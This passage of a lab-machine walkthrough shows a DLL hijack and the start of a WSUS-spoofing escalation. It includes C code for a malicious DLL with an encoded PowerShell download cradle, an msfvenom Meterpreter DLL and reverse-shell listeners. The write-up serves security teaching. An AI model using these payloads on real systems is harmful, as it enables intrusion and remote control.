+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">4/16/2026</span><span class="w">   </span><span class="nx">8:30</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Administrator</span><span class="w">
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">4/16/2026</span><span class="w">   </span><span class="nx">4:41</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">jaylee.clifton</span><span class="w">
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">4/17/2026</span><span class="w">   </span><span class="nx">8:33</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">msa_health</span><span class="err">$</span><span class="w">
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">4/17/2026</span><span class="w">   </span><span class="nx">1:47</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">toby.brynleigh</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="42-pivot-analysis-hunting-jaylee">4.2 Pivot Analysis: Hunting Jaylee</h2>
+
+<p>Based on the updated BloodHound data, <code class="language-plaintext highlighter-rouge">toby.brynleigh</code> is a member of high-tier administrative groups, but we currently lack a direct path to compromise that account. Our immediate objective shifts to <strong>jaylee.clifton</strong>.</p>
+
+<p>Since we are already on the DC as a service account, we will investigate local files, scheduled tasks, or running processes associated with Jaylee to find our next set of credentials or a path for lateral movement.</p>
+
+<p align="center">
+  <img src="../assets/images/bh_admin_path.png" alt="BloodHound - Domain Admin Nesting" />
+</p>
+
+<h2 id="43-automated-task-and-service-analysis">4.3 Automated Task and Service Analysis</h2>
+
+<p>Local enumeration via WinPEAS identified a non-standard monitoring and update suite running on the Domain Controller. Given the high logon count for <code class="language-plaintext highlighter-rouge">jaylee.clifton</code>, this infrastructure is the primary mechanism for privilege escalation.</p>
+
+<h3 id="431-scheduled-task-updatechecker-agent">4.3.1 Scheduled Task: UpdateChecker Agent</h3>
+
+<p>A scheduled task is configured to run a custom binary. This task is owned by the <strong>logging\Administrator</strong> account, providing a high-privileged execution context.</p>
+
+<ul>
+  <li><strong>Task Name:</strong> UpdateChecker Agent</li>
+  <li><strong>Binary Path:</strong> <code class="language-plaintext highlighter-rouge">C:\Program Files\UpdateMonitor\UpdateMonitor.exe</code></li>
+  <li><strong>Execution Interval:</strong> Repeats every <strong>3 minutes</strong> indefinitely.</li>
+</ul>
+
+<hr />
+
+<h1 id="5-updatemonitor-dll-hijacking">5. UpdateMonitor DLL Hijacking</h1>
+
+<h2 id="51-initial-enumeration--permissions-analysis">5.1 Initial Enumeration &amp; Permissions Analysis</h2>
+
+<p>During the enumeration of the <code class="language-plaintext highlighter-rouge">C:\Program Files\UpdateMonitor</code> directory, we observed significant permission misconfigurations. Using <code class="language-plaintext highlighter-rouge">icacls</code>, we verified that the <strong>logging\IT</strong> group possesses full control over the application directory and the service binary itself.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\UpdateMonitor"</span><span class="w">
+</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\UpdateMonitor</span><span class="w"> </span><span class="nx">logging\IT:</span><span class="p">(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+                               </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+                               </span><span class="n">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+                               </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\UpdateMonitor\UpdateMonitor.exe"</span><span class="w">
+</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\UpdateMonitor\UpdateMonitor.exe</span><span class="w"> </span><span class="nx">logging\IT:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+                                                 </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+                                                 </span><span class="n">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+                                                 </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Technical Analysis:</strong>
+The <code class="language-plaintext highlighter-rouge">(OI)(CI)(F)</code> flags on the parent directory indicate <strong>Object Inherit</strong>, <strong>Container Inherit</strong>, and <strong>Full Control</strong>. This means any subdirectories created (such as a <code class="language-plaintext highlighter-rouge">\bin\</code> folder) will also grant Full Control to the <strong>IT group</strong>. While our current <code class="language-plaintext highlighter-rouge">msa_health$</code> account is a standard user, this represents a direct escalation path to <strong>SYSTEM</strong> once we pivot to a member of the IT group, such as <code class="language-plaintext highlighter-rouge">jaylee.clifton</code>.</p>
+
+<h2 id="52-binary-analysis-dll-hijacking-discovery">5.2 Binary Analysis: DLL Hijacking Discovery</h2>
+
+<p>To identify the exact exploitation vector within the writable directory, <code class="language-plaintext highlighter-rouge">UpdateMonitor.exe</code> was analyzed using <strong>dnSpyEx</strong>. The decompiled C# code reveals that the application constructs a search path for a specific native dependency.</p>
+
+<h3 id="521-path-construction-logic">5.2.1 Path Construction Logic</h3>
+
+<p><img src="../assets/images/dnspy_paths.png" alt="dnSpy - UpdateMonitor Path Construction" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">Main</code> method defines the following paths for loading:</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">string</span> <span class="n">text3</span> <span class="p">=</span> <span class="s">"C:\\Program Files\\UpdateMonitor\\bin\\"</span><span class="p">;</span>
+<span class="kt">string</span> <span class="n">text4</span> <span class="p">=</span> <span class="s">"settings_update.dll"</span><span class="p">;</span>
+<span class="kt">string</span> <span class="n">text5</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">text3</span><span class="p">,</span> <span class="n">text4</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="522-native-library-loading-pinvoke">5.2.2 Native Library Loading (P/Invoke)</h3>
+
+<p><img src="../assets/images/dnspy_loadlibrary.png" alt="dnSpy - LoadLibrary P/Invoke" /></p>
+
+<p>The binary explicitly imports the native <code class="language-plaintext highlighter-rouge">LoadLibrary</code> function from <code class="language-plaintext highlighter-rouge">kernel32.dll</code> to load the constructed path (<code class="language-plaintext highlighter-rouge">text5</code>).</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Ansi</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
+<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">LoadLibrary</span><span class="p">(</span><span class="kt">string</span> <span class="n">lpFileName</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><strong>Conclusion:</strong></p>
+
+<p>The use of <code class="language-plaintext highlighter-rouge">kernel32!LoadLibrary</code> confirms that the program expects a <strong>native Windows DLL</strong> and will follow the standard Windows DLL Search Order. The application attempts to load this DLL from the <code class="language-plaintext highlighter-rouge">\bin\</code> subdirectory. Because we established in section 5.1 that the <strong>IT group</strong> has inherited write access to this path, we can perform a <strong>DLL Hijacking</strong> attack. Since the binary is triggered by a scheduled task owned by <code class="language-plaintext highlighter-rouge">Administrator</code>, our malicious <code class="language-plaintext highlighter-rouge">settings_update.dll</code> will execute with elevated <strong>SYSTEM</strong> privileges.</p>
+
+<h2 id="53-payload-generation-settings_updatedll">5.3 Payload Generation (settings_update.dll)</h2>
+
+<p>Before compiling the payload, we verified the architecture of the target binary using the <code class="language-plaintext highlighter-rouge">file</code> command. The output confirmed that <code class="language-plaintext highlighter-rouge">UpdateMonitor.exe</code> is a 32-bit application (<code class="language-plaintext highlighter-rouge">PE32 executable</code>, <code class="language-plaintext highlighter-rouge">Intel i386</code>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ file UpdateMonitor.exe
+UpdateMonitor.exe: PE32 executable <span class="k">for </span>MS Windows 6.00 <span class="o">(</span>console<span class="o">)</span>, Intel i386 Mono/.Net assembly, 3 sections
+</code></pre></div></div>
+
+<p>Because the parent process is 32-bit, our malicious DLL must also be compiled as 32-bit; otherwise, the <code class="language-plaintext highlighter-rouge">LoadLibrary</code> call will fail. We create our payload in C, hooking the <code class="language-plaintext highlighter-rouge">DLL_PROCESS_ATTACH</code> reason to execute a PowerShell reverse shell cradle.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// payload.c</span>
+<span class="cp">#include</span> <span class="cpf">&lt;winsock2.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#pragma comment(lib, "ws2_32")
+</span>
+<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="nf">PreUpdateCheck</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// PowerShell cradle (UTF-16LE Base64 encoded)</span>
+    <span class="c1">// Decodes to: IEX(New-Object Net.WebClient).downloadString("[http://10.10.16.25/shell.ps1](http://10.10.16.25/shell.ps1)")</span>
+    <span class="kt">wchar_t</span> <span class="n">cmd</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIAMQA0AC8AcwBoAGUAbABsAC4AcABzADEAIgApAA=="</span><span class="p">;</span>
+
+    <span class="n">STARTUPINFOW</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_HIDE</span><span class="p">;</span>
+
+    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NO_WINDOW</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">reason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">reserved</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">reason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PreUpdateCheck</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We compile this payload on our attacker machine using the <code class="language-plaintext highlighter-rouge">i686</code> MinGW cross-compiler to generate the final 32-bit <code class="language-plaintext highlighter-rouge">settings_update.dll</code> file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i686-w64-mingw32-gcc payload.c <span class="nt">-shared</span> <span class="nt">-o</span> settings_update.dll <span class="nt">-lws2_32</span>
+</code></pre></div></div>
+
+<h2 id="54-lateral-movement-pivoting-to-jaylee">5.4 Lateral Movement: Pivoting to Jaylee</h2>
+
+<p>To deploy the payload, we package it into an archive named <code class="language-plaintext highlighter-rouge">Settings_Update.zip</code>. Based on our earlier enumeration, a background process running as <code class="language-plaintext highlighter-rouge">jaylee.clifton</code> automatically extracts and interacts with updates placed in the <code class="language-plaintext highlighter-rouge">C:\ProgramData\UpdateMonitor\</code> directory.</p>
+
+<p>First, we zip the compiled DLL on our attacker machine and verify its contents:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ zip Settings_Update.zip settings_update.dll
+  adding: settings_update.dll <span class="o">(</span>deflated 67%<span class="o">)</span>
+
+➜ unzip <span class="nt">-l</span> Settings_Update.zip
+Archive:  Settings_Update.zip
+  Length      Date    Time    Name
+<span class="nt">---------</span>  <span class="nt">----------</span> <span class="nt">-----</span>   <span class="nt">----</span>
+    94890  2026-04-22 21:37   settings_update.dll
+<span class="nt">---------</span>                     <span class="nt">-------</span>
+    94890                     1 file
+</code></pre></div></div>
+
+<p>Next, we stage a Netcat listener to catch the reverse shell callback:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ rlwrap <span class="nt">-cAr</span> ncat <span class="nt">-lnvp</span> 9294
+</code></pre></div></div>
+
+<p>From our existing <code class="language-plaintext highlighter-rouge">msa_health$</code> WinRM session, we download the ZIP archive, copy it to the target processing directory, and grant <code class="language-plaintext highlighter-rouge">Everyone</code> Full Control to ensure Jaylee’s process can access it without permission errors:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nx">http://10.10.16.25/Settings_Update.zip</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">Settings_Update.zip</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cp</span><span class="w"> </span><span class="nx">Settings_Update.zip</span><span class="w"> </span><span class="nx">C:\ProgramData\UpdateMonitor\Settings_Update.zip</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="s1">'C:\ProgramData\UpdateMonitor\Settings_Update.zip'</span><span class="w"> </span><span class="nx">/grant</span><span class="w"> </span><span class="s1">'Everyone:(F)'</span><span class="w">
+</span><span class="n">processed</span><span class="w"> </span><span class="nx">file:</span><span class="w"> </span><span class="nx">C:\ProgramData\UpdateMonitor\Settings_Update.zip</span><span class="w">
+</span><span class="n">Successfully</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">files</span><span class="p">;</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="nx">processing</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">files</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Note: We use <code class="language-plaintext highlighter-rouge">icacls</code>, the built-in Windows utility for managing Access Control Lists (ACLs), to explicitly grant the <code class="language-plaintext highlighter-rouge">Everyone</code> group Full Control (<code class="language-plaintext highlighter-rouge">F</code>) over the transferred ZIP archive. Because the file was downloaded under our current <code class="language-plaintext highlighter-rouge">msa_health$</code> context, the default restrictive permissions would otherwise cause the target background process to hit an “Access Denied” error when attempting to extract our payload.</p>
+</blockquote>
+
+<p>Within a few moments, the background process processes the archive, executing our malicious DLL. We receive a callback on our listener, successfully landing a shell as <code class="language-plaintext highlighter-rouge">jaylee.clifton</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ rlwrap <span class="nt">-cAr</span> ncat <span class="nt">-lnvp</span> 9294
+...[snip]...
+
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname
+</span>logging<span class="se">\j</span>aylee.clifton
+DC01
+</code></pre></div></div>
+
+<p>Upon gaining access to <code class="language-plaintext highlighter-rouge">jaylee.clifton</code>’s profile via the reverse shell, we secure the user flag from the Desktop.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\jaylee.clifton</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">Desktop\user.txt</span><span class="w">
+</span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p><br /></p>
+
+<h2 id="53-alternative-payload-generation--lateral-movement-metasploit">5.3 Alternative Payload Generation &amp; Lateral Movement (Metasploit)</h2>
+
+<p>For a faster, more streamlined approach, we can utilize <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate the 32-bit malicious DLL and catch the callback using Metasploit’s <code class="language-plaintext highlighter-rouge">multi/handler</code>.</p>
+
+<p>First, we generate a Meterpreter reverse TCP DLL payload and package it into the expected <code class="language-plaintext highlighter-rouge">Settings_Update.zip</code> archive. Notably, <code class="language-plaintext highlighter-rouge">msfvenom</code> automatically defaults to the <code class="language-plaintext highlighter-rouge">x86</code> architecture, which perfectly aligns with our earlier analysis of the 32-bit <code class="language-plaintext highlighter-rouge">UpdateMonitor.exe</code> binary.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate 32-bit malicious-dll</span>
+➜ msfvenom <span class="se">\</span>
+    <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="se">\</span>
+    <span class="nv">LHOST</span><span class="o">=</span>tun0 <span class="nv">LPORT</span><span class="o">=</span>9294 <span class="se">\</span>
+    <span class="nt">-f</span> dll <span class="nt">-o</span> settings_update.dll
+
+<span class="c"># Compress it as zip archive &amp; check it</span>
+➜ zip Settings_Update.zip settings_update.dll
+➜ unzip <span class="nt">-l</span> Settings_Update.zip
+</code></pre></div></div>
+
+<p>From our existing WinRM session, we download the ZIP file to a temporary location, copy it to the <code class="language-plaintext highlighter-rouge">UpdateMonitor</code> processing directory, and grant <code class="language-plaintext highlighter-rouge">Everyone</code> Full Control to prevent Access Denied errors during extraction:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nx">http://10.10.16.25/Settings_Update.zip</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">Settings_Update.zip</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cp</span><span class="w"> </span><span class="nx">Settings_Update.zip</span><span class="w"> </span><span class="nx">C:\ProgramData\UpdateMonitor\Settings_Update.zip</span><span class="w">
+
+</span><span class="c"># Grant permission for everyone</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="s1">'C:\ProgramData\UpdateMonitor\Settings_Update.zip'</span><span class="w"> </span><span class="nx">/grant</span><span class="w"> </span><span class="s1">'Everyone:(F)'</span><span class="w">
+
+</span><span class="n">processed</span><span class="w"> </span><span class="nx">file:</span><span class="w"> </span><span class="nx">C:\ProgramData\UpdateMonitor\Settings_Update.zip</span><span class="w">
+</span><span class="n">Successfully</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">files</span><span class="p">;</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="nx">processing</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">files</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Simultaneously, we stage the Metasploit listener on our attacker machine. Once the background process unzips the archive and triggers the payload, the DLL is sideloaded, and we successfully catch a Meterpreter session as <code class="language-plaintext highlighter-rouge">jaylee.clifton</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ msfconsole <span class="nt">-qx</span> <span class="s1">'use exploits/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9294; exploit'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+LHOST <span class="o">=&gt;</span> tun0
+LPORT <span class="o">=&gt;</span> 9294
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.16.25:9294
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>199238 bytes<span class="o">)</span> to 10.129.245.130
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.16.25:9294 -&gt; 10.129.245.130:55490<span class="o">)</span> at 2026-04-22 21:59:33 +0530
+
+meterpreter <span class="o">&gt;</span> getuid
+Server username: logging<span class="se">\j</span>aylee.clifton
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="6-privilege-escalation-wsus-spoofing">6. Privilege Escalation: WSUS Spoofing</h1>
+
+<h2 id="61-post-exploitation-enumeration-jaylee">6.1 Post-Exploitation Enumeration (Jaylee)</h2>
+
+<p>Further enumeration of the user’s home directory reveals an interesting HTML file located in the <code class="language-plaintext highlighter-rouge">Documents\Tickets</code> folder. The filename indicates a past support incident regarding WSUS (Windows Server Update Services), which aligns with the ports discovered during the initial Nmap scan.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\jaylee.clifton</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">tree</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">/a</span><span class="w"> </span><span class="nx">/f</span><span class="w">
+</span><span class="n">Folder</span><span class="w"> </span><span class="nx">PATH</span><span class="w"> </span><span class="nx">listing</span><span class="w">
+</span><span class="n">Volume</span><span class="w"> </span><span class="nx">serial</span><span class="w"> </span><span class="nx">number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">C007-7498</span><span class="w">
+</span><span class="n">C:\USERS\JAYLEE.CLIFTON</span><span class="w">
+</span><span class="o">+-</span><span class="nt">--Desktop</span><span class="w">
+</span><span class="o">|</span><span class="w">       </span><span class="n">user.txt</span><span class="w">
+</span><span class="o">|</span><span class="w">
+</span><span class="o">+-</span><span class="nt">--Documents</span><span class="w">
+</span><span class="o">|</span><span class="w">   </span><span class="n">\---Tickets</span><span class="w">
+</span><span class="o">|</span><span class="w">           </span><span class="n">Incident_4922_WSUS_Remediation_ViewExport.html</span><span class="w">
+</span><span class="o">+-</span><span class="nt">--Downloads</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="62-wsus-misconfiguration-discovery">6.2 WSUS Misconfiguration Discovery</h2>
+
+<p>Rendering the contents of <code class="language-plaintext highlighter-rouge">Incident_4922_WSUS_Remediation_ViewExport.html</code> exposes a highly vulnerable, custom workaround implemented by the sysadmin to force Windows updates.</p>
+
+<p align="center">
+  <img src="../assets/images/wsus_ticket.png" alt="Support Incident View" />
+</p>
+
+<p><strong>Technical Analysis:</strong>
+The support ticket provides the exact blueprint for our privilege escalation path:</p>
+<ol>
+  <li><strong>Target Endpoint:</strong> The Domain Controller is configured to pull updates from a custom staging endpoint: <code class="language-plaintext highlighter-rouge">wsus.logging.htb</code>.</li>
+  <li><strong>DNS Hijacking Opportunity:</strong> The sysadmin notes that “DNS is still not updated”. This implies we can manipulate local resolution (such as modifying the <code class="language-plaintext highlighter-rouge">C:\Windows\System32\drivers\etc\hosts</code> file) to point <code class="language-plaintext highlighter-rouge">wsus.logging.htb</code> to our attacker IP.</li>
+  <li><strong>Aggressive Execution:</strong> A scheduled task named <code class="language-plaintext highlighter-rouge">ForceSync</code> runs every 2 minutes (120s), forcibly wiping the WSUS cache (<code class="language-plaintext highlighter-rouge">SoftwareDistribution</code>) and requesting a new update catalog.</li>
+</ol>
+
+<p>Because the Windows Update service runs under the context of <strong>NT AUTHORITY\SYSTEM</strong>, we can leverage our current privileges to modify the <code class="language-plaintext highlighter-rouge">hosts</code> file, stand up a rogue WSUS server (e.g., using <code class="language-plaintext highlighter-rouge">pywsus</code>), and push a malicious PsExec binary masquerading as a Windows update. Within 120 seconds, the <code class="language-plaintext highlighter-rouge">ForceSync</code> task will execute our payload as SYSTEM.</p>
+
+<h3 id="621-concept-overview-wsus-dns-hijacking-and-ad-cs-esc17">6.2.1 Concept Overview: WSUS, DNS Hijacking, and AD CS (ESC17)</h3>
+
+<p>Before executing the attack, it is important to understand why WSUS is a prime target for privilege escalation and how multiple vulnerabilities chain together in this scenario.</p>
+
+<p><strong>Windows Server Update Services (WSUS)</strong> allows IT administrators to centralize the deployment of updates. The local Windows Update service requests, downloads, and installs these patches, inherently operating under the highest local privilege level: <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+
+<p><strong>The Attack Vector:</strong>
+If an attacker can manipulate how a target resolves the WSUS server’s hostname (e.g., via DNS hijacking), they can redirect the update traffic to a rogue WSUS server (using tools like <code class="language-plaintext highlighter-rouge">pywsus</code>). The rogue server then feeds the target a malicious executable masquerading as a legitimate Microsoft update, which the target eagerly executes as SYSTEM.</p>
+
+<p><strong>The HTTPS Hurdle &amp; ESC17:</strong>
+Historically, WSUS attacks relied on targets communicating over unencrypted HTTP (port 8530). However, modern deployments (including this target) enforce HTTPS (port 8531). This means DNS hijacking alone will fail; the Windows Update client will immediately drop the connection if the rogue server does not present a TLS certificate explicitly signed and trusted by the domain’s Certificate Authority.</p>
+
+<p>This is where the <strong>AD CS ESC17</strong> vulnerability bridges the gap. ESC17 occurs when an Active Directory Certificate Services template is misconfigured to allow low-privileged users to supply arbitrary Subject Alternative Names (SANs) during enrollment. By abusing this, we can request a perfectly valid, domain-trusted certificate for the spoofed <code class="language-plaintext highlighter-rouge">wsus.logging.htb</code> hostname. Combining the DNS hijack with this ESC17-forged certificate allows us to seamlessly intercept the encrypted WSUS traffic and deliver our SYSTEM payload without triggering trust errors.</p>
+
+<h3 id="622-verifying-wsus-configuration-via-registry">6.2.2 Verifying WSUS Configuration via Registry</h3>
+
+<p>To confirm the details found in the support ticket, we query the Windows registry from our reverse shell to inspect the active Windows Update policies.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\jaylee.clifton</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"</span><span class="w"> </span><span class="nx">/s</span><span class="w">
+
+</span><span class="n">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate</span><span class="w">
+    </span><span class="nx">WUServer</span><span class="w">    </span><span class="nx">REG_SZ</span><span class="w">    </span><span class="p">[</span><span class="n">https</span><span class="p">:</span><span class="n">//wsus.logging.htb:8531</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="n">//wsus.logging.htb:8531</span><span class="p">)</span><span class="w">
+    </span><span class="n">AcceptTrustedPublisherCerts</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x1</span><span class="w">
+    </span><span class="n">SetProxyBehaviorForUpdateDetection</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x0</span><span class="w">
